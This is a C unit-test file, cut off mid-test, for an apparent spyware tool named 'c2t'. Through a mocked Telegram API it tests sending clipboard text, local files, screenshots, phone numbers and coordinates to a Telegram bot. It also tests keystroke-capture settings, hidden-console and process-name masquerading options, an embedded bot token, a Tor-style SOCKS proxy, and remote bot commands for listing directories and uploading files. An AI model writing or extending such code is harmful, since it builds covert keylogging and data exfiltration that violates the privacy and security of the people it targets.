/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#define _POSIX_C_SOURCE 200809L

#include "clipboard/clipboard_output.h"
#include "config/config.h"
#include "crypto/arena.h"
#include "crypto/crypto.h"
#include "files/files.h"
#include "keyboard/keyboard.h"
#include "keyboard/keyboard_output.h"
#include "logging/log_sender.h"
#include "logging/logging.h"
#include "screenshot/screenshot.h"
#include "screenshot/screenshot_encoder.h"
#include "screenshot/screenshot_output.h"
#include "telegram/telegram.h"
#include "telegram/telegram_platform.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static char last_method[32];
static char last_content_type[128];
static unsigned char *last_body;
static size_t last_body_length;
static int http_init_calls;
static int http_post_calls;
static int http_post_result = 1;
static int capture_http_bodies;
static unsigned char *captured_bodies;
static size_t captured_bodies_length;

static int capture_body(const void *body, size_t body_length) {
  if (!capture_http_bodies)
    return 1;
  if (body_length > SIZE_MAX - captured_bodies_length - 1U)
    return 0;
  unsigned char *expanded =
      realloc(captured_bodies, captured_bodies_length + body_length + 1U);
  if (!expanded)
    return 0;
  captured_bodies = expanded;
  memcpy(captured_bodies + captured_bodies_length, body, body_length);
  captured_bodies_length += body_length;
  captured_bodies[captured_bodies_length] = '\0';
  return 1;
}

static int fail(const char *message) {
  fprintf(stderr, "FAIL: %s\n", message);
  return 1;
}

static int test_arena(void) {
  c2t_arena_t arena = {};
  if (!c2t_arena_init(&arena, 128))
    return fail("arena initialization");

  void *first = c2t_arena_alloc(&arena, 1);
  void *second = c2t_arena_alloc(&arena, sizeof(max_align_t));
  int external = 0;
  if (!first || !second || !c2t_arena_contains(&arena, first) ||
      !c2t_arena_contains(&arena, second) ||
      c2t_arena_contains(&arena, &external) ||
      (uintptr_t)second % _Alignof(max_align_t) != 0 ||
      c2t_arena_alloc(&arena, SIZE_MAX) != nullptr) {
    c2t_arena_destroy(&arena);
    return fail("arena bounds and alignment");
  }

  c2t_arena_reset(&arena);
  if (c2t_arena_alloc(&arena, 1) != first) {
    c2t_arena_destroy(&arena);
    return fail("arena reset reuse");
  }
  arena.offset = SIZE_MAX;
  c2t_arena_reset(&arena);
  if (arena.offset != 0 || c2t_arena_alloc(&arena, 1) != first) {
    c2t_arena_destroy(&arena);
    return fail("arena corrupted offset recovery");
  }
  c2t_arena_destroy(&arena);
  if (arena.buffer || arena.capacity != 0 || arena.offset != 0 ||
      arena.is_locked)
    return fail("arena destroy state");

  c2t_arena_t invalid = {.buffer = (unsigned char *)1,
                         .capacity = 1,
                         .offset = 1,
                         .is_locked = 1};
  if (c2t_arena_init(&invalid, 0) || invalid.buffer || invalid.capacity != 0 ||
      invalid.offset != 0 || invalid.is_locked)
    return fail("arena failed initialization state");
  return 0;
}

static int body_contains(const void *value, size_t length) {
  if (length > last_body_length)
    return 0;
  for (size_t index = 0; index <= last_body_length - length; ++index) {
    if (memcmp(last_body + index, value, length) == 0)
      return 1;
  }
  return 0;
}

int telegram_http_init(void) {
  ++http_init_calls;
  return 1;
}

int telegram_http_post([[maybe_unused]] const char *token, const char *method,
                       const char *content_type, const void *body,
                       size_t body_length) {
  ++http_post_calls;
  snprintf(last_method, sizeof(last_method), "%s", method);
  snprintf(last_content_type, sizeof(last_content_type), "%s", content_type);
  free(last_body);
  last_body = malloc(body_length);
  if (!last_body)
    return 0;
  memcpy(last_body, body, body_length);
  last_body_length = body_length;
  if (!capture_body(body, body_length))
    return 0;
  return http_post_result;
}

int telegram_http_post_stream([[maybe_unused]] const char *token,
                              const char *method, const char *content_type,
                              c2t_stream_t *stream) {
  if (!stream || !stream->read)
    return 0;
  ++http_post_calls;
  snprintf(last_method, sizeof(last_method), "%s", method);
  snprintf(last_content_type, sizeof(last_content_type), "%s", content_type);
  free(last_body);
  last_body = malloc(stream->total_size ? stream->total_size : 1);
  if (!last_body)
    return 0;
  size_t read_bytes =
      stream->read(stream->user_data, last_body, stream->total_size);
  last_body_length = read_bytes;
  if (!capture_body(last_body, read_bytes))
    return 0;
  return http_post_result;
}

int telegram_http_get([[maybe_unused]] const char *token,
                      const char *method_and_query, char *response_out,
                      size_t response_capacity) {
  if (response_out && response_capacity > 0) {
    if (strstr(method_and_query, "getUpdates")) {
      snprintf(response_out, response_capacity,
               "{\"ok\":true,\"result\":["
               "{\"update_id\":100,\"message\":{\"from\":{\"username\":"
               "\"user1\"},\"chat\":{\"id\":-12345},\"text\":\"/status\"}},"
               "{\"update_id\":101,\"message\":{\"from\":{\"username\":"
               "\"user2\"},\"chat\":{\"id\":-12345},\"text\":\"/logs\"}},"
               "{\"update_id\":102,\"message\":{\"from\":{\"username\":"
               "\"user3\"},\"chat\":{\"id\":-12345},\"document\":{\"file_"
               "name\":\"uploaded_test.txt\",\"file_id\":\"doc_123\",\"file_"
               "size\":52},\"caption\":\"/tmp/test_c2t_upload.txt\"}}"
               "]}");
    } else if (strstr(method_and_query, "getFile")) {
      snprintf(response_out, response_capacity,
               "{\"ok\":true,\"result\":{\"file_id\":\"doc_123\",\"file_path\":"
               "\"documents/test_file.txt\",\"file_size\":52}}");
    } else {
      snprintf(response_out, response_capacity,
               "{\"ok\":true,\"result\":{\"username\":\"mock_bot\",\"id\":"
               "123456,\"chat\":{\"id\":123456}}}");
    }
  }
  return 1;
}

int telegram_http_download_file([[maybe_unused]] const char *token,
                                [[maybe_unused]] const char *telegram_file_path,
                                const char *dest_path,
                                [[maybe_unused]] size_t max_bytes,
                                size_t *downloaded_bytes) {
  if (!dest_path)
    return 0;
  FILE *fp = fopen(dest_path, "wb");
  if (!fp)
    return 0;
  const char mock_content[] =
      "This is a mock uploaded file payload from Telegram.\n";
  size_t len = sizeof(mock_content) - 1;
  fwrite(mock_content, 1, len, fp);
  fclose(fp);
  if (downloaded_bytes)
    *downloaded_bytes = len;
  return 1;
}

void telegram_http_thread_cleanup(void) {}

void telegram_http_cleanup(void) {}

static int test_updates_count = 0;
static char test_last_cmd[64] = {};
static char test_last_file_id[64] = {};
static char test_last_caption[64] = {};

typedef struct {
  int count;
  int attachment_leaked_between_updates;
  int64_t last_date;
  char final_file_id[64];
} parser_test_context_t;

static void parser_test_callback(const telegram_incoming_update_t *update,
                                 void *user_data) {
  parser_test_context_t *context = (parser_test_context_t *)user_data;
  if (!context || !update)
    return;
  ++context->count;
  context->last_date = update->date;
  if (update->update_id == 1 && update->file_id && *update->file_id)
    context->attachment_leaked_between_updates = 1;
  if (update->update_id == 2 && update->file_id)
    snprintf(context->final_file_id, sizeof(context->final_file_id), "%s",
             update->file_id);
}

static void test_callback(const telegram_incoming_update_t *update,
                          [[maybe_unused]] void *user_data) {
  if (!update)
    return;
  test_updates_count++;
  if (update->text)
    snprintf(test_last_cmd, sizeof(test_last_cmd), "%s", update->text);
  if (update->file_id)
    snprintf(test_last_file_id, sizeof(test_last_file_id), "%s",
             update->file_id);
  if (update->caption)
    snprintf(test_last_caption, sizeof(test_last_caption), "%s",
             update->caption);
}

int main(void) {
  if (test_arena() != 0)
    return 1;

  if (getenv("C2T_EXPECT_EMBEDDED") &&
      strcmp(getenv("C2T_EXPECT_EMBEDDED"), "1") == 0) {
    unsetenv("TELEGRAM_BOT_TOKEN");
    unsetenv("TELEGRAM_CHAT_ID");
    unsetenv("C2T_PROXY");
    unsetenv("TELEGRAM_PROXY");
    c2t_config_load_environment();
    if (!c2t_config_get()->telegram_bot_token ||
        strcmp(c2t_config_get()->telegram_bot_token,
               "987654:embedded-test-token") != 0 ||
        !c2t_config_get()->telegram_chat_id ||
        strcmp(c2t_config_get()->telegram_chat_id, "-987654") != 0 ||
        !c2t_config_get()->proxy ||
        strcmp(c2t_config_get()->proxy, "socks5://127.0.0.1:9050") != 0)
      return fail("post-link embedded Telegram configuration");
    return 0;
  }

  unsetenv("TELEGRAM_SEND_WINDOW_INFO");
  unsetenv("C2T_VERBOSE");
  c2t_config_load_environment();
  if (c2t_config_get()->telegram_send_window_info)
    return fail("window information must be disabled by default");
  setenv("TELEGRAM_SEND_WINDOW_INFO", "1", 1);
  c2t_config_load_environment();
  if (!c2t_config_get()->telegram_send_window_info)
    return fail("TELEGRAM_SEND_WINDOW_INFO must enable source metadata");
  unsetenv("TELEGRAM_SEND_WINDOW_INFO");
  c2t_config_load_environment();
  char *source_option[] = {(char *)"c2t", (char *)"--send-window-info"};
  if (c2t_config_apply_arguments(2, source_option) != NULL ||
      !c2t_config_get()->telegram_send_window_info)
    return fail("--send-window-info must enable source metadata");
  unsetenv("TELEGRAM_SEND_WINDOW_INFO");
  c2t_config_load_environment();
  c2t_log_init();
  if (c2t_log_is_verbose())
    return fail("verbose logging must be disabled by default");
  setenv("C2T_VERBOSE", "1", 1);
  c2t_config_load_environment();
  c2t_log_init();
  if (!c2t_log_is_verbose())
    return fail("C2T_VERBOSE must enable verbose logging");
  unsetenv("C2T_VERBOSE");
  c2t_config_load_environment();
  c2t_log_init();

  unsetenv("C2T_HIDE_CONSOLE");
  unsetenv("HIDE_CONSOLE");
  c2t_config_load_environment();
  if (c2t_config_get()->hide_console)
    return fail("hide_console must be disabled by default");
  setenv("C2T_HIDE_CONSOLE", "1", 1);
  c2t_config_load_environment();
  if (!c2t_config_get()->hide_console)
    return fail("C2T_HIDE_CONSOLE must enable hide_console");
  unsetenv("C2T_HIDE_CONSOLE");
  setenv("HIDE_CONSOLE", "1", 1);
  c2t_config_load_environment();
  if (!c2t_config_get()->hide_console)
    return fail("HIDE_CONSOLE must enable hide_console");
  unsetenv("HIDE_CONSOLE");
  c2t_config_load_environment();
  char *hide_option[] = {(char *)"c2t", (char *)"--hide-console"};
  if (c2t_config_apply_arguments(2, hide_option) != NULL ||
      !c2t_config_get()->hide_console)
    return fail("--hide-console must enable hide_console");

  unsetenv("C2T_PROXY");
  unsetenv("TELEGRAM_PROXY");
  c2t_config_load_environment();
  if (c2t_config_get()->proxy != nullptr)
    return fail("default proxy should be null");

  setenv("C2T_PROXY", "socks5://127.0.0.1:9050", 1);
  c2t_config_load_environment();
  if (!c2t_config_get()->proxy ||
      strcmp(c2t_config_get()->proxy, "socks5://127.0.0.1:9050") != 0)
    return fail("C2T_PROXY environment variable");
  unsetenv("C2T_PROXY");

  setenv("TELEGRAM_PROXY", "http://10.0.0.1:8080", 1);
  c2t_config_load_environment();
  if (!c2t_config_get()->proxy ||
      strcmp(c2t_config_get()->proxy, "http://10.0.0.1:8080") != 0)
    return fail("TELEGRAM_PROXY environment variable fallback");
  unsetenv("TELEGRAM_PROXY");

  char *proxy_args[] = {"c2t", "--proxy", "socks5h://localhost:1080"};
  c2t_config_load_environment();
  if (c2t_config_apply_arguments(3, proxy_args) != nullptr ||
      !c2t_config_get()->proxy ||
      strcmp(c2t_config_get()->proxy, "socks5h://localhost:1080") != 0)
    return fail("--proxy argument parsing");

  c2t_config_load_environment();

  unsetenv("TELEGRAM_ENABLED");
  c2t_config_load_environment();
  if (!telegram_init() || http_init_calls != 0)
    return fail("disabled Telegram must not require initialization");

  setenv("TELEGRAM_ENABLED", "1", 1);
  setenv("TELEGRAM_DEDUPLICATE", "1", 1);
  setenv("TELEGRAM_BOT_TOKEN", "123:test-token", 1);
  setenv("TELEGRAM_CHAT_ID", "-12345", 1);
  c2t_config_load_environment();
  if (!telegram_init() || http_init_calls != 1)
    return fail("enabled Telegram initialization");

  static const unsigned char png[] = {0x89, 'P', 'N', 'G', 0, 0xff};
  if (!telegram_send_data(png, sizeof(png), "image/png", NULL) ||
      strcmp(last_method, "sendPhoto") != 0 ||
      strncmp(last_content_type, "multipart/form-data; boundary=", 30) != 0 ||
      !body_contains(png, sizeof(png)) || !body_contains("name=\"photo\"", 12))
    return fail("PNG multipart photo upload");
  if (!telegram_send_data(png, sizeof(png), "image/png", nullptr) ||
      http_post_calls != 1)
    return fail("duplicate PNG must not be uploaded twice");

  static const unsigned char bmp[] = {'B', 'M', 0, 1};
  if (!telegram_send_data(bmp, sizeof(bmp), "image/bmp", nullptr) ||
      strcmp(last_method, "sendDocument") != 0 ||
      !body_contains("Content-Type: image/bmp", 23))
    return fail("BMP document upload");

  if (!telegram_send_data("hello world", 11, "text/plain;charset=utf-8",
                          nullptr) ||
      strcmp(last_method, "sendMessage") != 0 ||
      strcmp(last_content_type, "application/x-www-form-urlencoded") != 0 ||
      !body_contains("text=hello%20world", 18))
    return fail("text form upload");
  if (!telegram_send_data("hello world", 11, "text/plain;charset=utf-8",
                          nullptr) ||
      http_post_calls != 3)
    return fail("duplicate text must not be sent twice");

  static const char phone[] = "+39 333-123-4567";
  if (!telegram_send_data(phone, sizeof(phone) - 1, "text/plain", nullptr) ||
      strcmp(last_method, "sendContact") != 0 ||
      !body_contains("phone_number=%2B393331234567",
                     sizeof("phone_number=%2B393331234567") - 1) ||
      !body_contains("first_name=Clipboard",
                     sizeof("first_name=Clipboard") - 1))
    return fail("phone number contact card");
  if (!telegram_send_data(phone, sizeof(phone) - 1, "text/plain", nullptr) ||
      http_post_calls != 4)
    return fail("duplicate contact must not be sent twice");

  static const char international_phone[] = "0039 333 1234567";
  if (!telegram_send_data(international_phone, sizeof(international_phone) - 1,
                          "text/plain", nullptr) ||
      strcmp(last_method, "sendContact") != 0 ||
      !body_contains("phone_number=%2B393331234567",
                     sizeof("phone_number=%2B393331234567") - 1))
    return fail("00 international prefix normalization");

  static const char local_phone[] = "3348668699";
  if (!telegram_send_data(local_phone, sizeof(local_phone) - 1, "text/plain",
                          nullptr) ||
      strcmp(last_method, "sendMessage") != 0)
    return fail("phone without international prefix must remain text");

  static const char coordinates[] = "45.4642, 9.1900";
  if (!telegram_send_data(coordinates, sizeof(coordinates) - 1, "text/plain",
                          nullptr) ||
      strcmp(last_method, "sendLocation") != 0 ||
      !body_contains("ltd=45.46420000",
                     sizeof("ltd=45.46420000") - 1) ||
      !body_contains("lng=9.19000000",
                     sizeof("lng=9.19000000") - 1))
    return fail("coordinate location card");

  static const char vcard[] = "BEGIN:VCARD\r\nVERSION:3.0\r\nFN:Mario Rossi\r\n"
                              "TEL;TYPE=CELL:+39 320 1234567\r\nEND:VCARD";
  if (!telegram_send_data(vcard, sizeof(vcard) - 1, "text/vcard", nullptr) ||
      strcmp(last_method, "sendContact") != 0 ||
      !body_contains("first_name=Mario%20Rossi",
                     sizeof("first_name=Mario%20Rossi") - 1) ||
      !body_contains("vcard=BEGIN%3AVCARD", sizeof("vcard=BEGIN%3AVCARD") - 1))
    return fail("vCard contact card");

  static const char url[] = "https://example.com/path";
  if (!telegram_send_data(url, sizeof(url) - 1, "text/plain", nullptr) ||
      strcmp(last_method, "sendMessage") != 0)
    return fail("URL message with native preview");

  static const unsigned char gif[] = {'G', 'I', 'F', '8', '9', 'a'};
  http_post_result = 0;
  if (telegram_send_data(gif, sizeof(gif), "image/gif", nullptr))
    return fail("failed upload result");
  http_post_result = 1;
  if (!telegram_send_data(gif, sizeof(gif), "image/gif", nullptr) ||
      http_post_calls != 11)
    return fail("failed content must remain retryable");
  if (!telegram_send_data(gif, sizeof(gif), "image/gif", nullptr) ||
      http_post_calls != 11)
    return fail("retried content must be tracked after success");

  char file_path[] = "/tmp/c2t-file-test-XXXXXX";
  int file_descriptor = mkstemp(file_path);
  static const char file_contents[] = "clipboard file contents";
  if (file_descriptor < 0 ||
      write(file_descriptor, file_contents, sizeof(file_contents) - 1) !=
          (ssize_t)(sizeof(file_contents) - 1) ||
      close(file_descriptor) != 0)
    return fail("temporary file setup");

  if (c2t_file_try_clipboard_path(file_path, strlen(file_path), "text/plain",
                                  nullptr) != C2T_FILE_NOT_HANDLED)
    return fail("file paths must be disabled by default");
  setenv("TELEGRAM_SEND_FILES", "1", 1);
  c2t_config_load_environment();
  if (c2t_file_try_clipboard_path(file_path, strlen(file_path), "text/plain",
                                  nullptr) != C2T_FILE_SENT ||
      strcmp(last_method, "sendDocument") != 0 ||
      !body_contains(file_contents, sizeof(file_contents) - 1) ||
      !body_contains("filename=\"c2t-file-test-",
                     sizeof("filename=\"c2t-file-test-") - 1))
    return fail("filesystem file upload");

  char file_uri[128];
  int uri_length = snprintf(file_uri, sizeof(file_uri), "file://%s", file_path);
  if (uri_length <= 0 || (size_t)uri_length >= sizeof(file_uri) ||
      c2t_file_try_clipboard_path(file_uri, (size_t)uri_length, "text/uri-list",
                                  nullptr) != C2T_FILE_SENT ||
      http_post_calls != 12)
    return fail("filesystem file URI deduplication");

  /* Test oversized file error notification */
  setenv("TELEGRAM_MAX_FILE_BYTES", "5", 1);
  c2t_config_load_environment();
  int oversized_posts = http_post_calls;
  if (c2t_file_try_clipboard_path(file_path, strlen(file_path), "text/plain",
                                  nullptr) != C2T_FILE_SENT ||
      http_post_calls != oversized_posts + 1 ||
      strcmp(last_method, "sendMessage") != 0 ||
      !body_contains("File%20Delivery%20Failed",
                     sizeof("File%20Delivery%20Failed") - 1) ||
      !body_contains("exceeds%20configured%20limit",
                     sizeof("exceeds%20configured%20limit") - 1))
    return fail("oversized file must send Telegram error notification with "
                "path and reason");
  unsetenv("TELEGRAM_MAX_FILE_BYTES");
  c2t_config_load_environment();

  /* Test non-existent explicit file URI error notification */
  static const char missing_uri[] = "file:///tmp/c2t-missing-file-test.txt";
  int missing_posts = http_post_calls;
  if (c2t_file_try_clipboard_path(missing_uri, sizeof(missing_uri) - 1,
                                  "text/uri-list", nullptr) != C2T_FILE_SENT ||
      http_post_calls != missing_posts + 1 ||
      strcmp(last_method, "sendMessage") != 0 ||
      !body_contains("File%20Delivery%20Failed",
                     sizeof("File%20Delivery%20Failed") - 1) ||
      !body_contains("c2t-missing-file-test.txt",
                     sizeof("c2t-missing-file-test.txt") - 1))
    return fail(
        "missing explicit file URI must send Telegram error notification");

  /* Test plain non-file text must remain not handled (pass through as regular
   * text) */
  static const char plain_string[] = "not a real file path string";
  if (c2t_file_try_clipboard_path(plain_string, sizeof(plain_string) - 1,
                                  "text/plain",
                                  nullptr) != C2T_FILE_NOT_HANDLED)
    return fail("plain non-file text must return C2T_FILE_NOT_HANDLED");

  /* Test explicit directory URI error notification */
  static const char dir_uri[] = "file:///tmp";
  int dir_posts = http_post_calls;
  if (c2t_file_try_clipboard_path(dir_uri, sizeof(dir_uri) - 1, "text/uri-list",
                                  nullptr) != C2T_FILE_SENT ||
      http_post_calls != dir_posts + 1 ||
      strcmp(last_method, "sendMessage") != 0 ||
      !body_contains("File%20Delivery%20Failed",
                     sizeof("File%20Delivery%20Failed") - 1) ||
      !body_contains("directory", sizeof("directory") - 1))
    return fail("explicit directory URI must send Telegram error notification");

#ifndef _WIN32
  /* Test unreadable file (permission denied) - only effective when not running
   * as root */
  if (geteuid() != 0 && chmod(file_path, 0000) == 0) {
    int unreadable_posts = http_post_calls;
    if (c2t_file_try_clipboard_path(file_path, strlen(file_path), "text/plain",
                                    nullptr) != C2T_FILE_SENT ||
        http_post_calls != unreadable_posts + 1 ||
        strcmp(last_method, "sendMessage") != 0 ||
        !body_contains("File%20Delivery%20Failed",
                       sizeof("File%20Delivery%20Failed") - 1) ||
        !body_contains("Cannot%20open%20file",
                       sizeof("Cannot%20open%20file") - 1))
      return fail("unreadable file must send Telegram error notification");
    chmod(file_path, 0600);
  }
#endif

  /* Unit tests for file management API methods */
  char file_path2[] = "/tmp/c2t-cmd-test-XXXXXX";
  int fd2 = mkstemp(file_path2);
  if (fd2 < 0)
    return fail("temporary file 2 setup");
  static const char file_contents2[] = "file command distinct contents 2026";
  if (write(fd2, file_contents2, sizeof(file_contents2) - 1) !=
          (ssize_t)(sizeof(file_contents2) - 1) ||
      close(fd2) != 0) {
    unlink(file_path2);
    return fail("temporary file 2 write");
  }

  int f_posts = http_post_calls;
  if (c2t_file_send_path(file_path2, nullptr) != C2T_FILE_SENT ||
      http_post_calls != f_posts + 1 ||
      strcmp(last_method, "sendDocument") != 0 ||
      !body_contains(file_contents2, sizeof(file_contents2) - 1)) {
    unlink(file_path2);
    return fail("c2t_file_send_path with valid file");
  }
  unlink(file_path2);

  if (c2t_file_send_path(nullptr, nullptr) != C2T_FILE_ERROR ||
      c2t_file_send_path("/missing/nonexistent/file.bin", nullptr) !=
          C2T_FILE_ERROR)
    return fail("c2t_file_send_path error cases");

  char dir_list_buf[3800] = {};
  if (!c2t_file_list_directory("/tmp", dir_list_buf, sizeof(dir_list_buf)) ||
      strstr(dir_list_buf, "Directory:") == nullptr ||
      strstr(dir_list_buf, "Total:") == nullptr)
    return fail("c2t_file_list_directory valid directory");

  if (c2t_file_list_directory("/missing/dir/123", dir_list_buf,
                              sizeof(dir_list_buf)) != 0)
    return fail("c2t_file_list_directory non-existent directory");

  char preview_buf[3800] = {};
  if (!c2t_file_read_text_preview(file_path, preview_buf, sizeof(preview_buf),
                                  1000) ||
      strstr(preview_buf, "File:") == nullptr ||
      strstr(preview_buf, "<pre><code>") == nullptr)
    return fail("c2t_file_read_text_preview text file");

  char info_buf[1024] = {};
  if (!c2t_file_get_info(file_path, info_buf, sizeof(info_buf)) ||
      strstr(info_buf, "Filesystem Item Info") == nullptr ||
      strstr(info_buf, "Regular File") == nullptr)
    return fail("c2t_file_get_info regular file");

  char slashless_dir[3800] = {};
  if (!c2t_file_list_directory("/tmp", slashless_dir, sizeof(slashless_dir)) ||
      strstr(slashless_dir, "Directory:") == nullptr)
    return fail("c2t_file_list_directory /tmp listing");

  if (!c2t_file_get_info("/tmp", info_buf, sizeof(info_buf)) ||
      strstr(info_buf, "Directory") == nullptr)
    return fail("c2t_file_get_info directory");

  if (unlink(file_path) != 0)
    return fail("temporary file cleanup");

  telegram_cleanup();

  unsetenv("TELEGRAM_DEDUPLICATE");
  c2t_config_load_environment();
  if (!telegram_init())
    return fail("initialization without deduplication");
  int dedup_disabled_posts = http_post_calls;
  if (!telegram_send_data(png, sizeof(png), "image/png", nullptr) ||
      !telegram_send_data(png, sizeof(png), "image/png", nullptr) ||
      http_post_calls != dedup_disabled_posts + 2)
    return fail("duplicates must be sent when deduplication is disabled");

  static const char short_number[] = "123456";
  if (!telegram_send_data(short_number, sizeof(short_number) - 1, "text/plain",
                          nullptr) ||
      strcmp(last_method, "sendMessage") != 0)
    return fail("short numeric text must not become a contact");
  static const char invalid_coordinates[] = "91.0000, 9.1900";
  if (!telegram_send_data(invalid_coordinates, sizeof(invalid_coordinates) - 1,
                          "text/plain", nullptr) ||
      strcmp(last_method, "sendMessage") != 0)
    return fail("invalid coordinates must remain text");

  telegram_cleanup();

  setenv("TELEGRAM_DEDUPLICATE", "1", 1);
  c2t_config_load_environment();
  if (!telegram_init())
    return fail("source metadata test initialization");
  c2t_clipboard_source_t source = {
      .application = "Firefox", .title = "Example\npage", .process_id = 4242};
  int source_posts = http_post_calls;
  static const char source_message[] = "unique source text";
  if (!telegram_send_data(source_message, sizeof(source_message) - 1,
                          "text/plain", &source) ||
      http_post_calls != source_posts + 1 ||
      !body_contains("text=Source%3A%20Firefox%20%7C%20Example%20page%20%7C%20"
                     "PID%204242%0A%0Aunique%20source%20text",
                     sizeof("text=Source%3A%20Firefox%20%7C%20Example%20page%20"
                            "%7C%20PID%204242%0A%0Aunique%20source%20text") -
                         1))
    return fail("text source metadata formatting");
  if (!telegram_send_data(source_message, sizeof(source_message) - 1,
                          "text/plain", &source) ||
      http_post_calls != source_posts + 1)
    return fail("same content and source must be deduplicated");
  snprintf(source.title, sizeof(source.title), "%s", "Another window");
  if (!telegram_send_data(source_message, sizeof(source_message) - 1,
                          "text/plain", &source) ||
      http_post_calls != source_posts + 2)
    return fail("different source windows must remain distinguishable");

  static const unsigned char source_png[] = {0x89, 'P', 'N', 'G', 1};
  if (!telegram_send_data(source_png, sizeof(source_png), "image/png",
                          &source) ||
      strcmp(last_method, "sendPhoto") != 0 ||
      !body_contains("name=\"caption\"", sizeof("name=\"caption\"") - 1) ||
      !body_contains("Source: Firefox | Another window | PID 4242",
                     sizeof("Source: Firefox | Another window | PID 4242") - 1))
    return fail("file source metadata caption");

  static const char queued_message[] = "asynchronous clipboard delivery";
  setenv("C2T_QUEUE_MAX_BYTES", "1", 1);
  c2t_config_load_environment();
  int rejected_posts = http_post_calls;
  if (!clipboard_output_init())
    return fail("bounded clipboard queue initialization");
  clipboard_output(queued_message, sizeof(queued_message) - 1, "text/plain",
                   &source);
  clipboard_output_cleanup();
  if (http_post_calls != rejected_posts)
    return fail("oversized clipboard queue event must be rejected");

  unsetenv("C2T_QUEUE_MAX_BYTES");
  c2t_config_load_environment();
  int queued_posts = http_post_calls;
  if (!clipboard_output_init())
    return fail("clipboard delivery worker initialization");
  clipboard_output(queued_message, sizeof(queued_message) - 1, "text/plain",
                   &source);
  clipboard_output_cleanup();
  if (http_post_calls != queued_posts + 1 ||
      !body_contains("asynchronous%20clipboard%20delivery",
                     sizeof("asynchronous%20clipboard%20delivery") - 1))
    return fail("asynchronous clipboard delivery");

  setenv("C2T_DELIVERY_ATTEMPTS", "3", 1);
  setenv("C2T_RETRY_DELAY_MS", "1", 1);
  c2t_config_load_environment();
  int retry_posts = http_post_calls;
  static const char retry_message[] = "retry clipboard delivery";
  http_post_result = 0;
  if (!clipboard_output_init())
    return fail("retry worker initialization");
  clipboard_output(retry_message, sizeof(retry_message) - 1, "text/plain",
                   &source);
  clipboard_output_cleanup();
  http_post_result = 1;
  if (http_post_calls != retry_posts + 3)
    return fail("bounded delivery retry count");
  unsetenv("C2T_DELIVERY_ATTEMPTS");
  unsetenv("C2T_RETRY_DELAY_MS");
  c2t_config_load_environment();

  int cache_posts = http_post_calls;
  char cache_message[32];
  for (size_t index = 0; index <= 1600; ++index) {
    int cache_length = snprintf(cache_message, sizeof(cache_message),
                                "dedup-cache-%llu", (unsigned long long)index);
    if (cache_length <= 0 ||
        !telegram_send_data(cache_message, (size_t)cache_length, "text/plain",
                            nullptr))
      return fail("bounded deduplication cache population");
  }
  static const char evicted_message[] = "dedup-cache-0";
  if (!telegram_send_data(evicted_message, sizeof(evicted_message) - 1,
                          "text/plain", nullptr) ||
      http_post_calls != cache_posts + 1602)
    return fail("oldest deduplication entry must be evicted");
  static const char recent_cache_message[] = "dedup-cache-1024";
  if (!telegram_send_data(recent_cache_message,
                          sizeof(recent_cache_message) - 1, "text/plain",
                          nullptr) ||
      http_post_calls != cache_posts + 1602)
    return fail("deduplication lookup must survive cache eviction");

  setenv("TELEGRAM_SEND_LOGS", "1", 1);
  setenv("TELEGRAM_LOG_INTERVAL_SEC", "10", 1);
  c2t_config_load_environment();
  if (c2t_config_get()->telegram_send_logs != 1 ||
      c2t_config_get()->telegram_log_interval_sec != 10)
    return fail("telegram_send_logs and interval configuration parsing");
  if (!c2t_log_sender_init())
    return fail("log sender initialization");
  c2t_log_sender_cleanup();
  unsetenv("TELEGRAM_SEND_LOGS");
  unsetenv("TELEGRAM_LOG_INTERVAL_SEC");
  c2t_config_load_environment();

  if (!telegram_send_html("<b>Test Log</b>"))
    return fail("telegram_send_html execution");
  if (strcmp(last_method, "sendMessage") != 0 ||
      !body_contains("parse_mode=HTML", 15))
    return fail("telegram_send_html payload");

  clipboard_set_paused(1);
  if (!clipboard_is_paused())
    return fail("clipboard_set_paused(1)");
  if (clipboard_toggle_paused() != 0 || clipboard_is_paused() != 0)
    return fail("clipboard_toggle_paused()");
  clipboard_set_paused(0);

  keyboard_set_paused(1);
  if (!keyboard_is_paused())
    return fail("keyboard_set_paused(1)");
  if (keyboard_toggle_paused() != 0 || keyboard_is_paused() != 0)
    return fail("keyboard_toggle_paused()");
  keyboard_set_paused(0);

  /* Keyboard configuration tests */
  unsetenv("C2T_DISABLE_KEYBOARD");
  unsetenv("C2T_KEYBOARD_FLUSH_MS");
  c2t_config_load_environment();
  if (c2t_config_get()->disable_keyboard != 0 ||
      c2t_config_get()->keyboard_flush_ms != 3000)
    return fail("default keyboard configuration values");

  setenv("C2T_DISABLE_KEYBOARD", "1", 1);
  setenv("C2T_KEYBOARD_FLUSH_MS", "2500", 1);
  c2t_config_load_environment();
  if (c2t_config_get()->disable_keyboard != 1 ||
      c2t_config_get()->keyboard_flush_ms != 2500)
    return fail("custom keyboard configuration env parsing");

  char *kb_args[] = {(char *)"c2t", (char *)"--no-keyboard",
                     (char *)"--keyboard-flush-ms", (char *)"1500"};
  unsetenv("C2T_DISABLE_KEYBOARD");
  unsetenv("C2T_KEYBOARD_FLUSH_MS");
  c2t_config_load_environment();
  if (c2t_config_apply_arguments(4, kb_args) != nullptr ||
      c2t_config_get()->disable_keyboard != 1 ||
      c2t_config_get()->keyboard_flush_ms != 1500)
    return fail("keyboard cli arguments parsing");

  unsetenv("C2T_DISABLE_KEYBOARD");
  unsetenv("C2T_KEYBOARD_FLUSH_MS");
  c2t_config_load_environment();

#ifdef C2T_ENABLE_PROCESS_MASQUERADE
  /* Process name configuration tests */
  unsetenv("C2T_DAEMON_NAME");
  unsetenv("C2T_SUPERVISOR_NAME");
  c2t_config_load_environment();
  if (strcmp(c2t_config_get()->daemon_name, "c2t") != 0 ||
      strcmp(c2t_config_get()->supervisor_name, "t2c") != 0)
    return fail("default process names");

  setenv("C2T_DAEMON_NAME", "mydaemon", 1);
  setenv("C2T_SUPERVISOR_NAME", "mysup", 1);
  c2t_config_load_environment();
  if (strcmp(c2t_config_get()->daemon_name, "mydaemon") != 0 ||
      strcmp(c2t_config_get()->supervisor_name, "mysup") != 0)
